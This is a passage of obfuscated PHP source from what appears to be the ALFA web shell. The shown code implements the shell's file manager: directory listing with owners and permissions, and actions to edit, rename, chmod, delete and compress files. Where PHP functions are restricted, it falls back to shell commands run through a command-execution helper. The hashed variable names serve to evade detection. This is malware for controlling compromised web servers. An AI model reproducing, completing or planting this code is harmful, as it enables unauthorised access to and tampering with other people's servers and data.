echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
alfaFooter();
return;
}
global $xjfdlfkwcadc8c8db42409733582cb3e2298ef87;
$xjfdlfkwcadc8c8db42409733582cb3e2298ef87 = array('name', 1);
if(isset($_COOKIE["alfa_sort_by"]) && !empty($_COOKIE["alfa_sort_by"])){
	$xjfdlfkwcadc8c8db42409733582cb3e2298ef87[0] = $_COOKIE["alfa_sort_by"];
}
if(!empty($_POST['alfa1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc))
$xjfdlfkwcadc8c8db42409733582cb3e2298ef87 = array($ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1], (int)$ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[2]);
}
if($nbtopthif15df019c7cdad335361676ccccdd613 > ($pdkblcta21e255669741286e16ca36a2c67482f6-1)){
	$nbtopthif15df019c7cdad335361676ccccdd613 = 1;
}
$zqrvucqbd9455bc0782dc076b8679b65c56539b8 = rand(11111, 99999);
echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$zqrvucqbd9455bc0782dc076b8679b65c56539b8."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$zqrvucqbd9455bc0782dc076b8679b65c56539b8."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
$rgfoludk33030abc929f083da5f6c3f755b46034 = $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array();
$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = $kzsohgsx96f38927089025fcb666749c4ed3e17e;
if($qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 > $fhkqimnk979c39a7da56e11aec8d019f1141f3bf && $fhkqimnk979c39a7da56e11aec8d019f1141f3bf > 0){
	$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = ($fhkqimnk979c39a7da56e11aec8d019f1141f3bf * $nbtopthif15df019c7cdad335361676ccccdd613);
	if($qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 > $kzsohgsx96f38927089025fcb666749c4ed3e17e){
		$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 = $kzsohgsx96f38927089025fcb666749c4ed3e17e;
	}
}
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
if($fhkqimnk979c39a7da56e11aec8d019f1141f3bf > 0 && $nbtopthif15df019c7cdad335361676ccccdd613 > 1){
	$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = $fhkqimnk979c39a7da56e11aec8d019f1141f3bf * ($nbtopthif15df019c7cdad335361676ccccdd613 - 1);
}
$nfqanqtl9020897dcdf7d2351efb0dcd6928eeb2 = get_pagination_links($nbtopthif15df019c7cdad335361676ccccdd613,$pdkblcta21e255669741286e16ca36a2c67482f6 -1);
$kmgfttva96b8f562e3bd588b4bf8f33ece06bb5a = "";
for(;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
if($dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb){
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
$dkaogabh4ec4bcc7102266cf3de98ec5693b356a = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["owner"];
$rpagoyoaffa309cd16f9906446e409e8e1fca46c = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["group"];
$kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["modify"]);
$jldneloy4ac335b84cbc6e1bce3868e38065f567 = alfaPermsColor(array("class"=>$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["permcolor"],"num"=>$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["permnum"],"human"=>$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["permhuman"]),true);
$noybsmul234ef73792399c22704f8aef10b14541 = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["size"];
if(substr($ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"], 0 ,1) == "/"){
$dvqnfoff97fd815a3803a0588876bdd862014fed = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"] = "..";
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
}else{
$dvqnfoff97fd815a3803a0588876bdd862014fed = $GLOBALS['cwd']."/".$ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"];
}
}else{
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = $ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
$eajtptdv617a4046ef07a0d9851942247a994cf9 = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e)):array("name" => "????");
$ylzdpqhrd692bc40d83423d24d3a37582f58468c = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e)):array("name" => "????");
$dkaogabh4ec4bcc7102266cf3de98ec5693b356a = $eajtptdv617a4046ef07a0d9851942247a994cf9['name']?$eajtptdv617a4046ef07a0d9851942247a994cf9['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e):"????");
$rpagoyoaffa309cd16f9906446e409e8e1fca46c = $ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']?$ylzdpqhrd692bc40d83423d24d3a37582f58468c['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e):"????");
$kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $ydojshxa435ed7e9f07f740abf511a62c00eef6e));
$jldneloy4ac335b84cbc6e1bce3868e38065f567 = alfaPermsColor($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e);
$noybsmul234ef73792399c22704f8aef10b14541 = @filesize($GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e);
$dvqnfoff97fd815a3803a0588876bdd862014fed = $GLOBALS['cwd'].$ydojshxa435ed7e9f07f740abf511a62c00eef6e;
}
$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef = array('name' => $ydojshxa435ed7e9f07f740abf511a62c00eef6e,
'path' => $dvqnfoff97fd815a3803a0588876bdd862014fed,
'modify' => $kaetjeum0accdd691149b8182212528c8ed7330c,
'perms' => $jldneloy4ac335b84cbc6e1bce3868e38065f567,
'size' => $noybsmul234ef73792399c22704f8aef10b14541,
'owner' => $dkaogabh4ec4bcc7102266cf3de98ec5693b356a,
'group' => $rpagoyoaffa309cd16f9906446e409e8e1fca46c
);
if($ydojshxa435ed7e9f07f740abf511a62c00eef6e == ".." && !$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb){
	$wgjruzxgfa816edb83e95bf0c8da580bdfd491ef["path"] = str_replace("\\", "/", realpath($dvqnfoff97fd815a3803a0588876bdd862014fed));
}
if(!$dninrxalb3c2a4e4e995e2bb566ea05a15ae7efb){
if(@is_file($dvqnfoff97fd815a3803a0588876bdd862014fed)){
$cixmnxai6a989612dc00b5bbe81a5f0892e411f0 = array('type' => 'file');
if(@is_link($dvqnfoff97fd815a3803a0588876bdd862014fed)){
$cixmnxai6a989612dc00b5bbe81a5f0892e411f0["link"] = readlink($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef['path']);
}
$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, $cixmnxai6a989612dc00b5bbe81a5f0892e411f0);
}elseif(@is_link($dvqnfoff97fd815a3803a0588876bdd862014fed)){
$rgfoludk33030abc929f083da5f6c3f755b46034[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'link', 'link' => readlink($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef['path'])));
}elseif(@is_dir($dvqnfoff97fd815a3803a0588876bdd862014fed)&& ($ydojshxa435ed7e9f07f740abf511a62c00eef6e != ".")){
$rgfoludk33030abc929f083da5f6c3f755b46034[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'dir'));
}
}else{
	if($ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["type"]=="file"){
		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'file'));
	}else{
		if($ynxombge846b365452129ca6fc37251d7cc56b2d[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]["name"] != "."){
			$rgfoludk33030abc929f083da5f6c3f755b46034[] = array_merge($wgjruzxgfa816edb83e95bf0c8da580bdfd491ef, array('type' => 'dir'));
		}
	}
}
}
$GLOBALS['sort'] = $xjfdlfkwcadc8c8db42409733582cb3e2298ef87;
function alfaCmp($gtvtgpki0cc175b9c0f1b6a831c399e269772661, $aospafqz92eb5ffee6ae2fec3ad71c777531578f) {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower($gtvtgpki0cc175b9c0f1b6a831c399e269772661[$GLOBALS['sort'][0]]), strtolower($aospafqz92eb5ffee6ae2fec3ad71c777531578f[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
else
return (($gtvtgpki0cc175b9c0f1b6a831c399e269772661['size'] < $aospafqz92eb5ffee6ae2fec3ad71c777531578f['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1, "alfaCmp");
usort($rgfoludk33030abc929f083da5f6c3f755b46034, "alfaCmp");
if(isset($_COOKIE["alfa_filesman_direction"])&& !empty($_COOKIE["alfa_filesman_direction"])){
	if($_COOKIE["alfa_filesman_direction"] == 'desc'){
		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array_reverse($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1);
		$rgfoludk33030abc929f083da5f6c3f755b46034 = array_reverse($rgfoludk33030abc929f083da5f6c3f755b46034);
	}
}
$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array_merge($rgfoludk33030abc929f083da5f6c3f755b46034, $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1);
$rieuszxn2db95e8e1a9267b7a1188556b2013b33=0;
$omusmjtke0323a9039add2978bf5b49550572c7c=0;
foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $npviloqa8fa14cdd754f91cc6554c9e71929cce7){
$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'] = htmlspecialchars($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']);
$xnetwpjf96704c6e6d422933503bdc9586e164bf = mb_strlen($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'], 'UTF-8')>60?mb_substr($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'], 0, 60, 'utf-8').'...':$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'];
$kayboipx9fced129522f128b2445a41fb0b6ef9f = 'checkbox_'.$zqrvucqbd9455bc0782dc076b8679b65c56539b8.$omusmjtke0323a9039add2978bf5b49550572c7c;
$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab = rawurlencode($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']);
$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'],$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']).'" width="30" height="30">':'';
$tpqopcpra1b01e734b573fca08eb1a65e6df9a38 = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
echo '<tr class="fmanager-row" id="tr_row_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" class="chkbx" id="'.$kayboipx9fced129522f128b2445a41fb0b6ef9f .'"><label for="'.$kayboipx9fced129522f128b2445a41fb0b6ef9f .'"></label></div></td><td id="td_row_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'">'.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'<div style="'.$tpqopcpra1b01e734b573fca08eb1a65e6df9a38.'"><a row="'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" id="id_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" class="main_name" onclick="'.(($npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']=='file')?'editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\',\'auto\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" fname="'.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'].'" '.(isset($npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']."</span>":htmlspecialchars($xnetwpjf96704c6e6d422933503bdc9586e164bf)):'g(\'FilesMan\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['path'].'\');" href="#action=fileman&path='.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['path'].'" fname="'.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'].'" '.(isset($npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']=='file')?(isset($npviloqa8fa14cdd754f91cc6554c9e71929cce7['link'])?'[L] ':'').alfaSize($npviloqa8fa14cdd754f91cc6554c9e71929cce7['size']):$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['owner'].'/'.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['group'].'</span></td><td><a id="id_chmode_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" href=javascript:void(0) onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\',\'chmod\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">'.
$npviloqa8fa14cdd754f91cc6554c9e71929cce7['perms'].'</td><td><a id="id_rename_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'rename\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">R</a> <a id="id_touch_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'touch\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">T</a>'.(($npviloqa8fa14cdd754f91cc6554c9e71929cce7['type']=='file')?' <a id="id_edit_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'edit\',\'\',\'\',\'\',\''.$npviloqa8fa14cdd754f91cc6554c9e71929cce7['type'].'\')">E</a> <a id="id_download_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$omusmjtke0323a9039add2978bf5b49550572c7c.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($npviloqa8fa14cdd754f91cc6554c9e71929cce7['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$hzxvyprf325ad84eb20f1532ff3ea4722e3780ab.'\') : \'\';"> X </a></td></tr>';
$rieuszxn2db95e8e1a9267b7a1188556b2013b33 = $rieuszxn2db95e8e1a9267b7a1188556b2013b33?0:1;
$omusmjtke0323a9039add2978bf5b49550572c7c++;
}
echo "<tr id='filemanager_last_tr'><td colspan=7>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='".htmlspecialchars(($GLOBALS['glob_chdir_false']?$_POST['c']:$GLOBALS['cwd']))."'>
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
<input type='submit' value=' '>
</form></table><div class='pages-holder'><div class='pages-number'>".$nfqanqtl9020897dcdf7d2351efb0dcd6928eeb2."</div></div></div></div>";
alfafooter();
}
function get_pagination_links($fsfwxmea28707876df0831278a9529559e104f86, $dxnlohklae0fe0cc7e778fabf61f9217886eb31d){
    $bkyhrdoy807765384d9d5527da8848df14a4f02f = "";
    if ($dxnlohklae0fe0cc7e778fabf61f9217886eb31d >= 1 && $fsfwxmea28707876df0831278a9529559e104f86 <= $dxnlohklae0fe0cc7e778fabf61f9217886eb31d) {
		$bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
		$tknhrfzvb5dd22541781a81429693bb292129550 = "";
		if($fsfwxmea28707876df0831278a9529559e104f86 == 1){
			$tknhrfzvb5dd22541781a81429693bb292129550 = " active-page-number";
		}
        $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$tknhrfzvb5dd22541781a81429693bb292129550."\">1</a>";
        $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = max(2, $fsfwxmea28707876df0831278a9529559e104f86 - 5);
        if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741> 2)
            $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a class=\"page-number\">...</a>";
        for (; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < min($fsfwxmea28707876df0831278a9529559e104f86 + 6, $dxnlohklae0fe0cc7e778fabf61f9217886eb31d); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++) {
			if($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 == $fsfwxmea28707876df0831278a9529559e104f86){
				$tknhrfzvb5dd22541781a81429693bb292129550 = " active-page-number";
			}else{
				$tknhrfzvb5dd22541781a81429693bb292129550 = "";
			}
            $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$tknhrfzvb5dd22541781a81429693bb292129550."\">{$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741}</a>";
        }
        if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 != $dxnlohklae0fe0cc7e778fabf61f9217886eb31d)
            $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a class=\"page-number\">...</a>";
		$tknhrfzvb5dd22541781a81429693bb292129550 = " last-page-number";
		if($fsfwxmea28707876df0831278a9529559e104f86 == $dxnlohklae0fe0cc7e778fabf61f9217886eb31d){
			$tknhrfzvb5dd22541781a81429693bb292129550 .= " active-page-number";
		}
        $bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$tknhrfzvb5dd22541781a81429693bb292129550."\">{$dxnlohklae0fe0cc7e778fabf61f9217886eb31d}</a>";
		$bkyhrdoy807765384d9d5527da8848df14a4f02f .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
    }
    return $bkyhrdoy807765384d9d5527da8848df14a4f02f;
}
function alfaFilesTools(){
alfahead();
echo '<div class="filestools" style="height: 100%;">';
if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
$qdtibsqye1811c0c73fb371dc3b92d7bbabfc584 = $_POST['alfa1'];
$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = false;
if(!@chdir($_POST['c'])){
	$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = true;
	$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
	$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
	if($mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
		$avpzwwrjd63ca887e627bddccd346962a3573132 = addslashes($_POST['alfa1']);
		$hpqpacum080505fba0c91df9d7cff41d972acaf1 = explode(":", alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$avpzwwrjd63ca887e627bddccd346962a3573132.'"'));
		$wmjcghfrc0dbf420423102c20ba84dd9b0e049c2 = alfaEx("if [[ -w '".$avpzwwrjd63ca887e627bddccd346962a3573132."' ]]; then echo main_green_perm; elif [[ -r '".$avpzwwrjd63ca887e627bddccd346962a3573132."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['alfa2'] == 'auto'){
if(is_array(@getimagesize($_POST['alfa1']))){
$_POST['alfa2'] = 'image';
}else{
	$_POST['alfa2'] = 'view';
	if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
		if($mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
			$allbrbted02a169f33469c888396a24dd9d9f1c6 = explode(":", alfaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
			$oseogflpdef87f6eeed2542b0b6581a4d278c577 = $allbrbted02a169f33469c888396a24dd9d9f1c6[1];
			if(!empty($oseogflpdef87f6eeed2542b0b6581a4d278c577)){
				if(strstr($oseogflpdef87f6eeed2542b0b6581a4d278c577, "image")){
					$_POST['alfa2'] = 'image';
				}
			}
		}
	}
}
}
if($_POST['alfa2'] == "rename" && !empty($_POST['alfa3']) && @is_writable($_POST['alfa1'])){$pjsnqejl3707515996ae70bff801cd4bce3d80e2 = $_POST['alfa3'];}
if(@$_POST['alfa2'] == 'mkfile'){
$_POST['alfa1'] = trim($_POST['alfa1']);
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
	if(_alfa_is_writable($_POST["c"])){
		alfaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)."'");
		$_POST['alfa2'] = "edit";
	}
}
if(!@file_exists($_POST['alfa1'])){
$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @fopen($_POST['alfa1'], 'w');
if($zngnwtjj0666f0acdeed38d4cd9084ade1739498){
$_POST['alfa2'] = "edit";
fclose($zngnwtjj0666f0acdeed38d4cd9084ade1739498);
}
}else{
$_POST['alfa2'] = "edit";
}
}
if(!_alfa_file_exists(@$_POST['alfa1'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['alfa4']."');</script>";
alfaFooter();
return;
}
if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
$cgdmagdy11b4278c7e5a79003db77272c1ed2cf5 = $hpqpacum080505fba0c91df9d7cff41d972acaf1[3];
$uwdmfmmt9871d3a2c554b27151cacf1422eec048["name"] = $hpqpacum080505fba0c91df9d7cff41d972acaf1[1];
$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c["name"] = $hpqpacum080505fba0c91df9d7cff41d972acaf1[2];
$omvakvqa3ca67e555b55c35f8aa9f8ba2a2313f2 = alfaPermsColor(array("class"=>$wmjcghfrc0dbf420423102c20ba84dd9b0e049c2,"num"=>$hpqpacum080505fba0c91df9d7cff41d972acaf1[5],"human"=>$hpqpacum080505fba0c91df9d7cff41d972acaf1[6]),true);
}else{
$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):'';
$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):'';
if(!$uwdmfmmt9871d3a2c554b27151cacf1422eec048&&!$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c){
$uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'] = function_exists("fileowner")?@fileowner($_POST['alfa1']):'';
$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'] = function_exists("filegroup")?@filegroup($_POST['alfa1']):'';
}
$omvakvqa3ca67e555b55c35f8aa9f8ba2a2313f2 = alfaPermsColor($_POST['alfa1']);
$cgdmagdy11b4278c7e5a79003db77272c1ed2cf5 = @filesize($_POST['alfa1']);
if(!isset($uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'],$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'])||empty($uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'])||empty($zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'])){
	if(_alfa_can_runCommand()){
		list($uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'],$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name']) = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
	}
}
}
if(substr($_POST['alfa1'], 0, 7) == "phar://"){
	$cvvcegxs7f70fa14cf7823ef56dc89dc84c772b8 = $_POST['alfa1'];
}else{
	$cvvcegxs7f70fa14cf7823ef56dc89dc84c772b8 = str_replace("//", "/",($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772?"":$_POST['c'].'/').$_POST['alfa1']);
}
echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($cgdmagdy11b4278c7e5a79003db77272c1ed2cf5).' <span class="editor_file_info_vars">Permission:</span> '.$omvakvqa3ca67e555b55c35f8aa9f8ba2a2313f2.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'].'/'.$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($cvvcegxs7f70fa14cf7823ef56dc89dc84c772b8).'</div>';
if(empty($_POST['alfa2']))$_POST['alfa2'] = 'view';
if(!_alfa_is_dir($_POST['alfa1'])){
$cnspfppq6f8f57715090da2632453988d9a1501b = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
$yvdtggga39bb421562d6f6128a957f3d162538d2 = "file";
}else{
